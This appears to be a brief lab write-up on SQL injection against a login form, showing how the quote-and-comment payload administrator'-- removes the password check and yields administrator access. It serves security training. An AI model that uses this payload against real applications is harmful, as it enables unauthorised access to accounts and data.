SQL Injection - Login Functionality

perform an SQL injection attack that logs in to the application as the administrator user.

Analysis
----------
SELECT firstname FROM users WHERE username ='admin' and password ='admin'

SELECT firstname FROM users WHERE username =''' and password ='admin'

SELECT firstname FROM users WHERE username ='admin'--' and password ='admin'

SELECT firstname FROM users WHERE username ='admin'

SELECT firstname FROM users WHERE username ='administrator'--'

